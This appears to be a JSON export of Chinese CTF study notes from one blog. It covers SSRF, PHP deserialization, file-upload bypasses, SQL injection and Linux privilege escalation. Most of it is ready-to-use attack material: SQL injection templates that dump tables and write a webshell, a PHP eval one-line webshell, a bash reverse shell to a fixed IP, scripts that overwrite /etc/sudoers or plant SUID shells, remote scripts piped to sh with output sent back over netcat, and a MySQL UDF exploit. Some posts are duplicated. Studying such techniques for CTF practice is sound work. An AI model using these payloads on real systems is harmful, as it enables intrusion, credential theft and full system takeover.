[{"id":"41141451a0f1e1bb096d2164075e94d3","title":"SSRF","content":"SSRF\n\nSSRF信息收集ssrf信息收集File伪协议 扫描内网主机查看内网地址 file:&#x2F;&#x2F;&#x2F;etc&#x2F;host\n寻找内网其他主机 file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arpArp协议可无视防火墙 只要在工作即可扫出来\n配合BP扫描该网段\n\nssrf信息收集Ditc伪协议 扫描内网主机端口运用BP集束炸弹模式扫描网段和端口​    操作同理\n\nDitc伪协议 扫描速度快端口扫描常用端口\n\nssrf信息收集HTTP伪协议 扫描子域配合BP导入字典扫描\n\nSSRF Gopher伪协议​    \nGET传参poc​    \n进行url编码\n[gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;**_**GET%20&#x2F;name.php%3fname&#x3D;benben%20HTTP&#x2F;1.1%0d%0AHost:%20172.250.250.4%0d%0A](gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;_GET &#x2F;name.php%3fname&#x3D;benben HTTP&#x2F;1.1 Host: 172.250.250.4 )  \nGET提交最后一定要增加一个换行符 %0d%0a\n​    、\n也可以传一个 gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;_ 再将poc粘贴在后边（记得要2次URL编码可搭配BP或Hackbar）演示方法如下\nPOST传参poc\nContent-length 要和提交长度相对应 如上 name&#x3D;jianjian 有十三个字符 leangth为13 \n将poc放入拦截网站下划线后\n\n选中的部分进行两次URL编码\n\n编码后如图\n\n放行即可\n\n\nSSRF之回环地址绕过\n​    可见 127.0.0.1被禁止\n可以将点分十进制转换成十进制​    2130706433 即可绕过\n​    \n​    其他进制同理\n​    \nSSRF之302重定向绕过\n先搭建一个公网服务 （用php搭建）\n代码如下\n\n实现一个302重定向到127.0.0.1的功能\n开启网站服务\n\n再将监听的ip映射到公网服务器上\n访问公网ip之后即可重定向并返回到对方服务器下的flag.php的内容\n\nSSRF之DNS重绑定绕过​    DNS重绑定网站 http://lock.cmpxchg8b.com/rebinder.html\n​     \n​    \nSSRF之命令执行​    可以直接传cmd命令\n​    \n​    也可以搭配gopher协议使用 来传POST参数\nSSRF之XXE漏洞利用​    通过快照可知为post传参\n \n​    通过源代码可知content-type为xml 从而可以利用xxe漏洞\n​    \n​    Poc构造如下\n​    \n​    最后再利用gopher伪协议来提交POST参数\nSSRF之SQL注入GET注意两点即可\n​    1\n​    \n2\n\nPOST注入仍是利用gophar构造poc\n\nSSRF之文件上传​    利用gophar构造poc （注意content-type变化）\n \nPs:boundary&#x3D;xxxxx xxxxx可自定义 在上边poc中 –xxxxx为分割符 –xxxxx–为结束符\n​    上传完成之后访问文件目录即可\n\nSSRF写入操作​    【0x016 使用SSRF对mysql进行未授权查询】https://www.bilibili.com/video/BV1qQ4y1u7S4?vd_source&#x3D;dbbe851caa5969ed57ce1b7f9b095e7c\n​    16-21\n​    \n常见的绕过方式总结1、限制为http://www.xxx.com 域名时（利用@）txt可以尝试采用http基本身份认证的方式绕过\n如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异\n在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。2.采用短网址绕过txt比如百度短地址https://dwz.cn/3.采用进制转换txt127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.在这里插入图片描述\n4.利用特殊域名txt原理是DNS解析。xip.io可以指向任意域名，即\n127.0.0.1.xip.io，可解析为127.0.0.1\n(xip.io 现在好像用不了了，可以找找其他的)5.利用[::]txt可以利用[::]来绕过localhost\nhttp://169.254.169.254&gt;&gt;http://[::169.254.169.254]6.利用句号txt127。0。0。1 &gt;&gt;&gt; 127.0.0.17、CRLF 编码绕过txt%0d-&gt;0x0d-&gt;\\r回车\n%0a-&gt;0x0a-&gt;\\n换行\n进行HTTP头部注入example.com&#x2F;?url&#x3D;http://eval.com%0d%0aHOST:fuzz.com%0d%0a \ntxt18.利用封闭的字母数字txt利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com\nhttp://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳\n⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇\n⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛\n⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵\nⒶ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ\nⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ\n⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴\n⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿","slug":"SSRF","date":"2024-10-24T06:13:31.000Z","categories_index":"","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"aead1356d56fb4acb210e498b4d44c7a","title":"Unserialize","content":"Unserialize前置知识\n  \n   序列化后语句为\n1a:3:&#123;s:4:&quot;name&quot;;s:8:&quot;John Doe&quot;;s:3:&quot;age&quot;;i:25;s:6:&quot;grades&quot;;a:3:&#123;i:0;i:85;i:1;i:90;i:2;i:78;&#125;&#125;\n\n\na:3: 表示这是一个关联数组类型（即 Array）。\n{} 表示数组元素的开始和结束。\ns:4:”name”;     表示键名为 “name” 的字符串类型元素，长度为 4。\ns:8:”John     Doe”; 表示键名为 “name” 的字符串类型值，长度为 8。\ns:3:”age”;     表示键名为 “age” 的字符串类型元素，长度为 3。\ni:25; 表示键名为 “age” 的整数类型值。\ns:6:”grades”;     表示键名为 “grades” 的字符串类型元素，长度为 6。\na:3:{} 表示一个索引数组类型（即 Array），包含三个元素。\ni:0;i:85; 表示第一个元素的键名为 0，值为 85。\ni:1;i:90; 表示第二个元素的键名为 1，值为 90。\ni:2;i:78; 表示第三个元素的键名为 2，值为 78。\n\n魔术变量__construct()构造函数实例化对象时触发__destruct()析构函数对象销毁时unserialize后触发\n基础漏洞实例\n__sleep序列化之前触发\n\nsleep与 serialize捆绑，所以url传参时直接传命令本体\n__wakeup反序列化之前触发用法与sleep相似\nWakeup与unserialize捆绑\n所以url传参时直接传命令的序列化形式\nEg:\n\n摘出wakeup中相关的参数,写php运行出相应的payload序列化式命令 \n\n\n进行url传参获取目标\n\nWakeup绕过当序列化字符串中表示对象属性个数的值大于真实的属性个数时\n会跳过__wakeup的执行\n 可见题解 https://www.nssctf.cn/note/set/2934\n__toString()把对象当做字符串调用时触发相关函数 strtolower()\nEg:\n1234567891011121314151617&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $benben = &quot;this is test!!&quot;;        public function __toString() &#123;        return &#x27;格式不对，输出不了!&#x27;;    &#125;&#125;$test = new User();print_r($test);echo &quot;&lt;br /&gt;&quot;;echo $test;?&gt;\n\n12User Object ( [benben] =&gt; this is test!! ) 格式不对，输出不了!\n\n \n标记的两句均把对象当做字符串调用\n__invoke()把对象当函数调用时触发触发相关代码\nreturn $bb();\n示例\n123456789101112131415161718&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $benben = &quot;this is test!!&quot;;    public function __invoke() &#123;        echo &#x27;它不是个函数!&#x27;;        return $this; // return $this to allow chaining    &#125;&#125;$test = new User();echo $test-&gt;benben;echo &quot;&lt;br /&gt;&quot;;echo $test()-&gt;benben; // This will now work correctly?&gt;\n\n执行结果\n12this is test!!它不是个函数!\n\n__call()调用不存在的方法或函数时触发触发相关代码\n $this-&gt;start-&gt;helloworld();\n1234567891011&lt;?phpclass User &#123;    public function __call($arg1, $arg2) &#123;        echo &quot;$arg1,$arg2[0]&quot;;    &#125;&#125;$test = new User();$test-&gt;callxxx(&#x27;a&#x27;);?&gt;  //执行结果 callxxx,a\n\n\n\n\n\n__callStatic() (静态）调用不存在的成员方法触发静态调用：**$test::callxxx(‘a’)**\n\n\n__get()调用不存在的成员属性时触发访问其他类中私有属性\n__set()给不存在的成员属性赋值时触发\n__isset()和__unset()调用protrcted &#x2F;private &#x2F; 不存在的成员属性时触发__clone()当使用clone关键字拷贝完一个对象时触发字符串逃逸减少\n前后引号不计入长度 \n“system()”字符串长度为8\n三个为24；就会多吃掉24个字符串\n将xx对应v2成员属性长度和构造v3总字符串长度之和\n\n12str__replace(“system()”,” ”,$data);//将$data中的system（）替换成空字符\n\n\n\n\n构造时注意闭合\n\n用var_dump(unserialize())来判断是否成功逃逸 成功逃逸标志 看obj个数\n\n字符串逃逸减少例题讲解视频https://www.bilibili.com/video/BV1R24y1r71C?p=18&amp;vd_source=dbbe851caa5969ed57ce1b7f9b095e7c\n例题网站：http://192.168.38.128:8002/class17/1.php\n**字符串逃逸减少 **\n构造用到成员属性多**(需要2个)**\n构造时不要漏掉成员属性\n增多https://www.bilibili.com/video/BV1R24y1r71C?p=17&amp;vd_source=dbbe851caa5969ed57ce1b7f9b095e7c\n例题网站：http://192.168.38.128:8002/class16/1.php\n**字符串逃逸 增多 构造用到成员属性少（1个）增多题目 **\n用var_dump来检验\n\n在此题中仅构造user即可，无需管pass(因为pass目标值已构造在user中)，\n吐出字符数量要和  相匹配（从   ”;   开始计数到   ;}   停止)\n引用\n在此题中若要保证enter和sercret一致\n可以让secret引用enter的值\n\n**&amp;**引用符号\nphar文件利用\n\n利用条件\nPhp.ini中的phar.readonly要开启\nPhar文件构造\n变更第三行的class和第十一行实例化的对象,生成文件内容如下\n\n生成txt.phar之后改后缀.Jpg .png .gif 上传\nPost传参 获取flag\n\n例题 https://www.nssctf.cn/problem/3018\n​    https://www.nssctf.cn/problem/466\n","slug":"Unserilize","date":"2024-10-23T13:07:30.000Z","categories_index":"ctf入门","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"aead1356d56fb4acb210e498b4d44c7a","title":"Unserialize","content":"Unserialize前置知识\n  \n   序列化后语句为\n1a:3:&#123;s:4:&quot;name&quot;;s:8:&quot;John Doe&quot;;s:3:&quot;age&quot;;i:25;s:6:&quot;grades&quot;;a:3:&#123;i:0;i:85;i:1;i:90;i:2;i:78;&#125;&#125;\n\n\na:3: 表示这是一个关联数组类型（即 Array）。\n{} 表示数组元素的开始和结束。\ns:4:”name”;     表示键名为 “name” 的字符串类型元素，长度为 4。\ns:8:”John     Doe”; 表示键名为 “name” 的字符串类型值，长度为 8。\ns:3:”age”;     表示键名为 “age” 的字符串类型元素，长度为 3。\ni:25; 表示键名为 “age” 的整数类型值。\ns:6:”grades”;     表示键名为 “grades” 的字符串类型元素，长度为 6。\na:3:{} 表示一个索引数组类型（即 Array），包含三个元素。\ni:0;i:85; 表示第一个元素的键名为 0，值为 85。\ni:1;i:90; 表示第二个元素的键名为 1，值为 90。\ni:2;i:78; 表示第三个元素的键名为 2，值为 78。\n\n魔术变量__construct()构造函数实例化对象时触发__destruct()析构函数对象销毁时unserialize后触发\n基础漏洞实例\n__sleep序列化之前触发\n\nsleep与 serialize捆绑，所以url传参时直接传命令本体\n__wakeup反序列化之前触发用法与sleep相似\nWakeup与unserialize捆绑\n所以url传参时直接传命令的序列化形式\nEg:\n\n摘出wakeup中相关的参数,写php运行出相应的payload序列化式命令 \n\n\n进行url传参获取目标\n\nWakeup绕过当序列化字符串中表示对象属性个数的值大于真实的属性个数时\n会跳过__wakeup的执行\n 可见题解 https://www.nssctf.cn/note/set/2934\n__toString()把对象当做字符串调用时触发相关函数 strtolower()\nEg:\n1234567891011121314151617&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $benben = &quot;this is test!!&quot;;        public function __toString() &#123;        return &#x27;格式不对，输出不了!&#x27;;    &#125;&#125;$test = new User();print_r($test);echo &quot;&lt;br /&gt;&quot;;echo $test;?&gt;\n\n12User Object ( [benben] =&gt; this is test!! ) 格式不对，输出不了!\n\n \n标记的两句均把对象当做字符串调用\n__invoke()把对象当函数调用时触发触发相关代码\nreturn $bb();\n示例\n123456789101112131415161718&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $benben = &quot;this is test!!&quot;;    public function __invoke() &#123;        echo &#x27;它不是个函数!&#x27;;        return $this; // return $this to allow chaining    &#125;&#125;$test = new User();echo $test-&gt;benben;echo &quot;&lt;br /&gt;&quot;;echo $test()-&gt;benben; // This will now work correctly?&gt;\n\n执行结果\n12this is test!!它不是个函数!\n\n__call()调用不存在的方法或函数时触发触发相关代码\n $this-&gt;start-&gt;helloworld();\n1234567891011&lt;?phpclass User &#123;    public function __call($arg1, $arg2) &#123;        echo &quot;$arg1,$arg2[0]&quot;;    &#125;&#125;$test = new User();$test-&gt;callxxx(&#x27;a&#x27;);?&gt;  //执行结果 callxxx,a\n\n\n\n\n\n__callStatic() (静态）调用不存在的成员方法触发静态调用：**$test::callxxx(‘a’)**\n\n\n__get()调用不存在的成员属性时触发访问其他类中私有属性\n__set()给不存在的成员属性赋值时触发\n__isset()和__unset()调用protrcted &#x2F;private &#x2F; 不存在的成员属性时触发__clone()当使用clone关键字拷贝完一个对象时触发字符串逃逸减少\n前后引号不计入长度 \n“system()”字符串长度为8\n三个为24；就会多吃掉24个字符串\n将xx对应v2成员属性长度和构造v3总字符串长度之和\n\n12str__replace(“system()”,” ”,$data);//将$data中的system（）替换成空字符\n\n\n\n\n构造时注意闭合\n\n用var_dump(unserialize())来判断是否成功逃逸 成功逃逸标志 看obj个数\n\n字符串逃逸减少例题讲解视频https://www.bilibili.com/video/BV1R24y1r71C?p=18&amp;vd_source=dbbe851caa5969ed57ce1b7f9b095e7c\n例题网站：http://192.168.38.128:8002/class17/1.php\n**字符串逃逸减少 **\n构造用到成员属性多**(需要2个)**\n构造时不要漏掉成员属性\n增多https://www.bilibili.com/video/BV1R24y1r71C?p=17&amp;vd_source=dbbe851caa5969ed57ce1b7f9b095e7c\n例题网站：http://192.168.38.128:8002/class16/1.php\n**字符串逃逸 增多 构造用到成员属性少（1个）增多题目 **\n用var_dump来检验\n\n在此题中仅构造user即可，无需管pass(因为pass目标值已构造在user中)，\n吐出字符数量要和  相匹配（从   ”;   开始计数到   ;}   停止)\n引用\n在此题中若要保证enter和sercret一致\n可以让secret引用enter的值\n\n**&amp;**引用符号\nphar文件利用\n\n利用条件\nPhp.ini中的phar.readonly要开启\nPhar文件构造\n变更第三行的class和第十一行实例化的对象,生成文件内容如下\n\n生成txt.phar之后改后缀.Jpg .png .gif 上传\nPost传参 获取flag\n\n例题 https://www.nssctf.cn/problem/3018\n​    https://www.nssctf.cn/problem/466\n","slug":"Unserialize","date":"2024-10-23T13:07:30.000Z","categories_index":"ctf入门","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"8b370a147ba28b5f9bf92d0ab1030d7d","title":"LFI","content":"文件上传判断漏洞形式\n一句话木马\n后缀 空格和点搭配 反复试 eg a.php. .\n后缀 %00和0x00截断 %00需要PHP版本小于5.3.4\n%00截断如图\n\n覆盖配置.htaccess文件\nuser.ini\n前者内容如图\n\n大小写绕过a.php::$DATA伪造GIF89agetimagesize()若图片马 无法直接利用\n\n伪造文件头(在PHP文件文件中伪造) GIF89a \n\n将木马写到合法文件里\n1copy /b test.png+1.php muma.png\n\n直接使用工具增加备注写入一句话木马\n\n\n重命名重命名为xxx.php:.jpg \n然后再上传xxx.&lt;&lt;&lt;\nMIME伪造改Content-Type\n常见Content-Type后缀\n\n二次渲染准备多个图片马 每个木马位置要不同 多次尝试多次上传 要多留坚强的图片马\n时间竞争\nburp抓包 发送攻击器 攻击\n不断上传生成木马文件的文件\n\n此文件如下\n\n\n不断访问前者\n\n改后缀名 .phtml .phps .pht .phtml .php3 .php5 …… \nPHP标签修改木马内容\n123456789GIF89a&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&quot;a&quot;]);show_source(&quot;/flag&quot;); (可有可没有)&lt;/script&gt;\n\n复写1.jpg改为1.jpg.php \n再用蚁剑连接，连接时名称为：1.jpg.php\n双写1.php改为1.phphpp\n","slug":"LFI","date":"2024-10-23T13:05:28.000Z","categories_index":"ctf入门","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"6c4585b45b97f020140cf6fd5e44ee5e","title":"upload","content":"文件上传判断漏洞形式\n一句话木马\n后缀 空格和点搭配 反复试 eg a.php. .\n后缀 %00和0x00截断 %00需要PHP版本小于5.3.4\n%00截断如图\n\n覆盖配置.htaccess文件\nuser.ini\n前者内容如图\n\n大小写绕过a.php::$DATA伪造GIF89agetimagesize()若图片马 无法直接利用\n\n伪造文件头(在PHP文件文件中伪造) GIF89a \n\n将木马写到合法文件里\n1copy /b test.png+1.php muma.png\n\n直接使用工具增加备注写入一句话木马\n\n\n重命名重命名为xxx.php:.jpg \n然后再上传xxx.&lt;&lt;&lt;\nMIME伪造改Content-Type\n常见Content-Type后缀\n\n二次渲染准备多个图片马 每个木马位置要不同 多次尝试多次上传 要多留坚强的图片马\n时间竞争\nburp抓包 发送攻击器 攻击\n不断上传生成木马文件的文件\n\n此文件如下\n\n\n不断访问前者\n\n改后缀名 .phtml .phps .pht .phtml .php3 .php5 …… \nPHP标签修改木马内容\n123456789GIF89a&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&quot;a&quot;]);show_source(&quot;/flag&quot;); (可有可没有)&lt;/script&gt;\n\n复写1.jpg改为1.jpg.php \n再用蚁剑连接，连接时名称为：1.jpg.php\n双写1.php改为1.phphpp\n","slug":"upload","date":"2024-10-23T05:58:00.000Z","categories_index":"ctf入门","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"d55a4990aee4e4791fcfc2d40ba4ba3b","title":"sql","content":"SQL Injection宽字节绕过addslashes() 功能 在‘和“前加\\来实体化 \nGET（需要是GBK编码）在’或”前加%df eg: %df’%df” 解决实体化问题 ps:有时要将‘换成**%27**  “同理；\n\n  当查询到字段时，库名用database()代替，需将’users‘换成0x7573657273 (7573657273是users字符转换成16进制仅转换表名，不要加上’或”) ps:不要忘掉0x 字符转16进制网站：https://www.sojson.com/hexadecimal.html  \nPOST 因为%df是url编码，无法用到POST传参\n\n所以需要用burp抓包，然后在Hex中将’前的16进制数改为df；\n与gbk编码为三字节的汉语组合，eg:汉（GBK三字节文字）  ß’ or 1&#x3D;1–+ &#x3D;&gt;汉‘ or 1&#x3D;1 –  ß就是%df在post传参的体现\n\n&#x3D;的平替空格的平替： like  &#x2F;*&#x2F;, %20, %0a(换行),%a0,(),+;** \n参数污染 eg sqli_labs-29 url参数get传参为?id&#x3D;1 ,参数污染即再传一个相同的参数 eg:id&#x3D;1&amp;id&#x3D;1’ union select… 闭合在第二个参数后\n注释 –，–+，–%20,–qwe,#,and ‘1’&#x3D;’1,%23(注意闭合方式与参数闭合保持一致)\n堆叠注入 极其危险 若有mysqli_multi_query函数 即可堆叠注入\n 须先闭合参数 \n1insert into users(id,username,password) value (&#x27;100&#x27;,&#x27;100&#x27;,&#x27;100&#x27;) --qwe\n\n可以根据堆叠注入来修改密码\n\n拿表 \n1show tables;\n\n拿字段\n1show columns from `xxx ` \n\n\n\n\nps:用反引号来包裹名字\n\n二次注入less-24 注册时用户名为 admin&#39;# \n密码为111111\n这样一来用户admin的密码便改为111111\n联合查询语句模板库名1?id=1&#x27; union select 1,2,database() --+\n\n表名1?id=1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+\n\n字段名1?id=1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+\n\n字段内容1?id=1&#x27; union select 1,group_concat(username),group_concat(password) from users --+\n\n报错注入语句模板库名1?id=1&#x27;extractvalue(1,concat(&#x27;~&#x27;,(select database()))) --+\n\n表名1?id=1&#x27;extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+\n\n字段名1?id=1&#x27;extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) --+\n\n字段内容1?id=1&#x27;extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(username),group_concat(password) from users))) --+\n\n时间盲注语句模板库名长度1?id=1&#x27; and（length(database()))=8 and sleep(1) --+\n\n 如果页面响应时间为1秒，则数据库长度为8\n​      \n库名1?id=1&#x27; and (ascii(substr(database(),1,1)))=115 and sleep(1) --+\n\n 如果页面响应时间为1秒，则数据库第一位字母为s (s的ascii值是115)\n表名长度1?id=1&#x27; and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&gt;=8 and sleep(1) --+ \n\n​      \n表名1?id=1&#x27; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=115 and sleep(1) --+\n\n 如果页面响应时间为1秒，则数据库第一个表的第一个字母为e\n字段名长度1?id=1&#x27; and (length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)))=10 and sleep(1) --+\n\n 如果页面响应时间为1秒，则数据库users表第一个字段的长度为10\n字段名1?id=1&#x27; and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1)))=115 and sleep(1) --+\n\n 如果页面响应时间为1秒，则数据库users表第一个字段的第一个字母为e\n字段内容长度1?id=1&#x27; and (length((select password from users limit 0,1)))=4 and sleep(1) --+ \n\n如果页面响应时间为1秒，则数据库users表第一个字段的第一个内容长度为4\n字段内容1?id=1&#x27; and (ascii(substr((select password from users limit 0,1),1,1)))=115 and sleep(1) --+\n\n 如果页面响应时间为1秒，则数据库users表第一个字段的第一个内容的字为e\nif语句if(1,2,3)\n1?id=1&#x27;and if(length(database()&gt;1,sleep(2),1)\n\n 如果页面响应时间为2秒，则数据库长度大于1\n\n10:sql写马语句（前提：mysql开启了secure_file_priv&#x3D;””的配置，可以堆叠注入）eg: ?id&#x3D;1’;select’‘into outfile ‘c:&#x2F;&#x2F;www&#x2F;&#x2F;1.php’\nsql文件操作语句读文件1234567select load_file(&#x27;c:/boot.ini&#x27;) #可以用16进制代替字符串select load_file(0x633a2f626f6f742e696e69)select load_file(&#x27;//ecma.io/1.txt&#x27;) # smb协议select load_file(&#x27;\\\\\\\\ecma.io\\\\1.txt&#x27;) # 可用于DNS隧道\n\n写文件12select 0x313233 into outfile &#x27;D:/1.txt&#x27;select 0x313233 into dumpfile &#x27;D:/1.txt&#x27;\n\n加载文件内容到字段中1LOAD DATA INFILE &#x27;/path/to/data.txt&#x27; INTO TABLE data\n\n 将该 TXT 文件中的数据加载到 data 表的 content 字段中\n查看 sql_modePIPES_AS_CONCAT 开启时\n即可执行连接语句 \ncommand1;command2\n顺序执行\ncommand1 || command2 \n如果command1执行失败，则执行command2\ncommand1 &amp;&amp; command2\n如果command1执行成功，则执行command2\n例题\nhttps://www.nssctf.cn/note/set/36\n总结\n检查闭合 不要用?xxx&#x3D;1’ and 1&#x3D;1 来判断，用?xxx&#x3D;1’ and sleep(1)判断，这样可以减少试错次数；***\n\norder by 直接从2开始*** \n\n不要忘记无闭合，如果这样的话语句最后加注释可加可不加；\n\n熟练之后可以直接从查询表明开始 即用 \n1?id=1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+\n\nmid函数使用 ?id&#x3D;1’ union select 1,2,mid(group_concat(flag),20,20) from\n\nsys.schema_auto_increment_columns 平替 information_schema.columns\n\n\n","slug":"sql","date":"2024-10-23T02:25:59.000Z","categories_index":"ctf入门","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"8253069df3e619a90109a077baa63a85","title":"提权","content":"获取交互式shell123python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;stty raw -echoexpotr TERM=xterm-color\n\n提权shell脚本shell.sh\n反弹shell12#!/bin/bashbash -i &gt;&amp;/dev/tcp/192.168.38.130/8888 0&gt;&amp;1\n\nkali开启监听等待脚本执行\n写入sudoers12#!/bin/bashecho “用户名 ALL=(root) NOPASSWD: ALL” &gt; /etc/sudoers\n\n执行脚本后\n123sudo –l #会显示ALL=(root) NOPASSWD: ALLsudo bash #提权成功\n\n写入tmp123#!/bin/bashcp /bin/bash /tmp/rootbashchmod +xs /tmp/rootbash\n\n执行脚本后\n1/tmp/rootbash -p\n\n\n\n提权手工枚举1.查看用户1234whoamiidwho  #查看还有哪些用户登录当前系统last #系统最近登陆记录\n\n2.查看系统版本和内核1234uname -a cat /etc/issuecat /proc/versionhostnamectl\n\n3.查看网络信息1234ip addrip route #查看路由表信息ip neigh #查看ip邻居arp -a #查看ip绑定的mac地址\n\n4.其他重要枚举命令12345678sudo -lgetcap -r / 2&gt;/dev/null #递归查找系统根目录 / 下所有文件的能力（capabilities）ls -laFls -liahhostname #查看当前主机在内网中的角色,显示当前主机的名称或域名，通常用于确认该主机在网络中的角色或识别主机history  #显示当前用户的命令历史记录，帮助用户查看以前执行过的命令which    #显示命令的完整路径，通常用于确认某个命令的安装位置cat /etc/fstab\n\n1cat /etc/passwd\n\n理解 &#x2F;etc&#x2F;passwd 文件含义\n我们先了解一下 /etc/passwd内容的含义：\nLinux 密码信息保存在两个文件中，分别为：/etc/passwd和 /etc/shadow\n/etc/passwd文件用于保存用户信息，每一行代表一个用户，每一行通过冒号 :分为七个部分:\n\n用户名\n密码，若为 x则表示密码保存在/etc/shadow\nUID，0 代表 root\nGID，表示所在组\n描述信息，依次为 Full Name、Room Number、Work Phone、Home Phone 和 Other\n用户主目录\n默认 shell 类型\n\n要重点关注第shell类型来判断出可利用的用户\n例如，假设 /etc/passwd文件中其中一行信息如下：\n\n其含义解读如下：\n\n用户名：test-user\n密码保存在 /etc/shadow中\nUID 为 1001\nGID 为 1001\n描述信息： Full Name [test]: Room Number [11111]: Work Phone [111111-11]: Home Phone [222222-22]: Other [test]\n用户主目录为 /home/test-user\n默认 shell 为 /bin/bash\n*由此可见，/etc/passwd文件在 linux 登录认证过程中起到非常关键的作用\n\n5.查看进程1234ps -ef #查看所有进程ps axjf #包括没有控制终端的进程ps auxtop -n 1 #指定只显示一次更新并退出。可以用来快速查看当前的进程状态\n\n\na：显示所有用户的进程。\nu：以用户为中心的格式显示进程信息，包括用户名、CPU 和内存使用情况。\nx：包括没有控制终端的进程。\nj：以作业格式显示进程信息。\nf：显示进程的树状结构，显示父子进程关系。\n\n1234netstat -anetstat -atu  #查看tcp udp端口占用情况netstat -anonetstat -s\n\n\n**-a**：显示所有连接和监听的端口。这意味着它会列出所有的活动连接以及所有正在监听的服务。\n**-n**：以数字形式显示地址和端口号，而不是尝试解析主机名和服务名称。这可以加快命令的执行速度，并避免 DNS 解析的延迟。\n**-o**：显示与每个连接相关的进程 ID（PID）。这使得你可以知道哪个进程在使用特定的网络连接。\n**-s**：显示每个网络协议的统计信息。输出包括各种协议的发送和接收数据包、出错信息、丢包情况等\n\n6.查看环境变量12echo $PATHenv\n\n7.查看定时任务1cat /etc/crontab\n\n自动化枚举\nLinpeas\nLinenum\nlinux-smart-enumeration\nlinux-exploit-suggester\nlinuxprivchecker\nunix-privesc-check\n\n12curl -L https://github.com/carlospolop/PEASS-ng/reeleases/download/20230425-bd7331ea/linpeas.shsh #Linpeas文件不落地扫描\n\n如果靶机不联网1234python -m http.server 80 #kaliwget http://xx/xx.sh | sh |nc kali的ip 8888 #靶机sudo nc -lvnp 8888 | tee linpeas.txt  #kaliless -r linpeas.txt \n\n\n在 Kali Linux 上，你启动了一个 HTTP 服务器，能够提供 xx.sh 脚本的下载。\n靶机 通过 wget 下载并执行该脚本。执行的输出通过 netcat 发送回 Kali Linux。\nKali Linux 上的 netcat 监听器接收输出，并将其保存到文件中\n\n不使用curl wget\n12cat &lt; /dev/tcp/10.10.10.10/80 |sh #靶机sudo nc -lvnp 80 &lt; linpeas.sh #kali \n\nlinux常用指令\n\nMy sql UDFUDF :user defined function123456789searchploit UDFcat 1518.cgcc -g -c raptor_udf2.cgcc -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lcmysql -u xxxx -p\n\n前提条件secure_file_priv为空 ps:为null不行\n或者是指定目录为目标目录\n1234567891011121314151617show variables like &#x27;%secure_file_priv%&#x27;；show variables like &#x27;%plugin%&#x27;;use mysql;create table foo(line blob);insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2so&#x27;));select *from foo into dumpfile &#x27;/usr/lib/raptor_udIf2.so&#x27;;create function do_system returns integer soname_&#x27;raptor_udf2.so&#x27;;select * from mysql.func; #到此自定义函数成功#可以利用这个函数讲/bin/bash复制到/tmp目录下select do_system(&#x27;cp /bin/bash /tmp/rootbash; chmod 777 /tmp/rootbash&#x27;);\n\n123#退出数据库cd /tmprootbash -p\n\nshadow文件利用提权可读12cat /etc/shadow #如果可读cat /etc/shadow |grep &#x27;:\\$&#x27; 